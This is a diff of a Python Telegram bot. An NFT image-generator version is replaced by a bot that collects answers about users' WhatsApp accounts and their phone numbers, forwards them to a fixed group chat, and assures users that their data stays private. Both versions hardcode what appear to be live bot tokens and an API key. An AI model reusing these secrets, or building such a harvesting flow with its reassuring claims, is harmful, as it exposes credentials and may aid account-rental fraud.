@@ -1,139 +1,151 @@
-import os
-import base64
-import requests
-from io import BytesIO
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler
-from dotenv import load_dotenv
+import logging
+from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    MessageHandler,
+    ConversationHandler,
+    ContextTypes,
+    filters,
+)
 
-# Загрузка переменных окружения
-load_dotenv()
+# Логирование
+logging.basicConfig(
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
+)
+logger = logging.getLogger(__name__)
 
-# Конфигурация
-TELEGRAM_TOKEN = "8092687951:AAGp4a-h-CYi4eVn-pqF9cXjjK49gVj2K-M"
-STABILITY_API_KEY = "sk-BfNK4kYxvgkv0BQVd0o1Tq1BF6h0MSp2rwAgWC0av9S1kdu2"
+# Состояния диалога
+QUESTIONS, PHONE = range(2)
+
+# ID группы, куда отправляются данные
+GROUP_CHAT_ID = -4631460753
+
+# Клавиатуры
+start_keyboard = ReplyKeyboardMarkup([["📜 Мои объявления"]], resize_keyboard=True)
+main_keyboard = ReplyKeyboardMarkup(
+    [["📜 Мои объявления", "⬅️ Назад"]], resize_keyboard=True
+)
+phone_keyboard = ReplyKeyboardMarkup(
+    [["📜 Мои объявления", "⬅️ Назад"]], resize_keyboard=True
+)
 
 
-# Инициализация
-app = Application.builder().token(TELEGRAM_TOKEN).build()
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Старт диалога."""
+    context.user_data.setdefault("phones", [])  # Инициализируем список телефонов
 
-# Хранение данных пользователей
-user_data = {}
-
-# Команда /start
-async def start(update: Update, context):
-    keyboard = [
-        [InlineKeyboardButton("Открыть галерею", web_app={"url": "https://tonfox-lixaradka-lixaradkas-projects.vercel.app/"})]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
-        "🔮 Добро пожаловать в Цифрового Алхимика!\n"
-        "Отправьте текст, чтобы создать NFT-артефакт.",
-        reply_markup=reply_markup
+        "Привет! Это бот для аренды WhatsApp аккаунтов.\n"
+        "Ответьте на вопросы:\n"
+        "1. Когда был создан аккаунт?\n"
+        "2. Насколько активен аккаунт?\n\n"
+        "Введите ответы через запятую.",
+        reply_markup=main_keyboard,
     )
+    return QUESTIONS
 
-# Обработка текстовых сообщений
-async def handle_message(update: Update, context):
+
+async def get_questions(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Получаем ответы и просим ввести номер телефона."""
     text = update.message.text
-    user_id = update.message.from_user.id
 
-    if not text:
-        await update.message.reply_text("Пожалуйста, отправьте текстовое сообщение.")
-        return
+    if text == "📜 Мои объявления":
+        return await list_phones(update, context)
 
-    try:
-        # Генерация изображения
-        image_url = await generate_image(text)
-        
-        # Обновление данных пользователя
-        await update_user_data(user_id, xp=10)
-        
-        # Отправка результата
-        await update.message.reply_photo(
-            photo=image_url,
-            caption=f"🎨 Ваш артефакт создан!\n"
-                    f"🔗 Просмотреть: {image_url}"
+    if text == "⬅️ Назад":
+        return await start(update, context)
+
+    context.user_data["answers"] = text
+
+    await update.message.reply_text(
+        "❤️ Спасибо! Теперь введите ваш номер телефона.📞\n\n"
+        "🛡️ Мы не имеем доступа к вашему аккаунту.\n"
+        "🔏 Ваши данные не передаются третьим лицам.",
+        reply_markup=phone_keyboard,
+    )
+    return PHONE
+
+
+async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Сохраняем номер телефона и отправляем данные в группу."""
+    text = update.message.text
+
+    if text == "⬅️ Назад":
+        await update.message.reply_text(
+            "🔙 Вернулись назад. Введите ответы на вопросы.", reply_markup=main_keyboard
         )
-    except Exception as e:
-        await update.message.reply_text(f"⚠️ Ошибка: {str(e)}")
+        return QUESTIONS
 
-# Генерация изображения через Stability AI
-UPLOAD_FOLDER = 'uploads'
-if not os.path.exists(UPLOAD_FOLDER):
-    os.makedirs(UPLOAD_FOLDER)
+    if text == "📜 Мои объявления":
+        return await list_phones(update, context)
 
-async def generate_image(prompt):
-    url = "https://api.stability.ai/v1/generation/stable-diffusion-xl-1024-v1-0/text-to-image"
-    headers = {
-        "Authorization": f"Bearer {STABILITY_API_KEY}",
-        "Content-Type": "application/json"
-    }
-    data = {
-        "text_prompts": [{"text": prompt}],
-        "cfg_scale": 7,
-        "height": 1024,
-        "width": 1024,
-        "samples": 1,
-        "steps": 30
-    }
+    # Сохраняем номер в список
+    context.user_data["phones"].append(text)
 
-    response = requests.post(url, headers=headers, json=data)
-    if response.status_code != 200:
-        raise Exception(f"Stability API Error: {response.text}")
+    # Получаем данные пользователя
+    user = update.message.from_user
+    username = user.username
+    user_identifier = f"@{username}" if username else f"ID: {user.id}"
 
-    # Сохранение изображения
-    image_data = response.json()["artifacts"][0]["base64"]
-    image_bytes = base64.b64decode(image_data)
-    image_file = BytesIO(image_bytes)
-    image_file.name = f"artifact_{int(time.time())}.png"  # Уникальное имя файла
-
-    # Сохраняем изображение на сервере
-    with open(os.path.join(UPLOAD_FOLDER, image_file.name), 'wb') as f:
-        f.write(image_file.getvalue())
-
-    return f"/{UPLOAD_FOLDER}/{image_file.name}"
-
-
-# Обновление данных пользователя
-async def update_user_data(user_id, xp=0):
-    if user_id not in user_data:
-        user_data[user_id] = {"xp": 0, "level": 1}
-    user_data[user_id]["xp"] += xp
-    if user_data[user_id]["xp"] >= 100 * user_data[user_id]["level"]:
-        user_data[user_id]["level"] += 1
-        await app.bot.send_message(
-            chat_id=user_id,
-            text=f"🎉 Поздравляем! Вы достигли уровня {user_data[user_id]['level']}!"
-        )
-
-# Команда для покупки кредитов
-async def buy_credits(update: Update, context):
-    await update.message.reply_invoice(
-        title="Покупка кредитов",
-        description="100 кредитов для генерации изображений",
-        payload="100_credits",
-        provider_token="YOUR_PROVIDER_TOKEN",  # Получите у платежного провайдера
-        currency="USD",
-        prices=[{"label": "100 Credits", "amount": 500}]  # $5.00
+    # Отправляем данные в группу
+    message = (
+        f"📌 Новый запрос:\n"
+        f"👤 Пользователь: {user_identifier}\n"
+        f"📋 Ответы: {context.user_data.get('answers')}\n"
+        f"📱 Номер телефона: {text}"
     )
 
-# Обработка успешного платежа
-async def handle_successful_payment(update: Update, context):
-    user_id = update.message.from_user.id
-    if user_id not in user_data:
-        user_data[user_id] = {"credits": 0}
-    user_data[user_id]["credits"] += 100
-    await update.message.reply_text("✅ Платеж успешен! Ваши кредиты добавлены.")
+    await context.bot.send_message(chat_id=GROUP_CHAT_ID, text=message)
 
-# Регистрация обработчиков
-app.add_handler(CommandHandler("start", start))
-app.add_handler(CommandHandler("buy", buy_credits))
-app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-app.add_handler(CallbackQueryHandler(handle_successful_payment))
+    await update.message.reply_text(
+        "✅ Ваши данные отправлены! Мы с вами свяжемся как можно быстрее.",
+        reply_markup=start_keyboard,
+    )
 
-# Запуск бота
+    return ConversationHandler.END
+
+
+async def list_phones(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Отправляет пользователю список его отправленных номеров."""
+    phones = context.user_data.get("phones", [])
+
+    if not phones:
+        await update.message.reply_text("📭 Вы ещё не отправили ни одного номера.", reply_markup=main_keyboard)
+    else:
+        phone_list = "\n".join(phones)
+        await update.message.reply_text(f"📜 Ваши объявления:\n{phone_list}", reply_markup=main_keyboard)
+
+    return QUESTIONS if update.message.text == "📜 Мои объявления" else PHONE
+
+
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Отмена операции."""
+    await update.message.reply_text(
+        "🚫 Операция отменена. Отправьте /start для начала заново.",
+        reply_markup=ReplyKeyboardRemove(),
+    )
+    return ConversationHandler.END
+
+
+def main():
+    """Запуск бота."""
+    application = Application.builder().token("7941700806:AAGCClSoFdHWwV1c4u5YVpMT3-9qFokGV4Y").build()
+
+    conv_handler = ConversationHandler(
+        entry_points=[CommandHandler("start", start)],
+        states={
+            QUESTIONS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_questions)],
+            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
+        },
+        fallbacks=[CommandHandler("cancel", cancel)],
+    )
+
+    application.add_handler(conv_handler)
+    application.run_polling()
+
+
 if __name__ == "__main__":
-    print("Бот запущен...")
-    app.run_polling()
+    main()
 
 
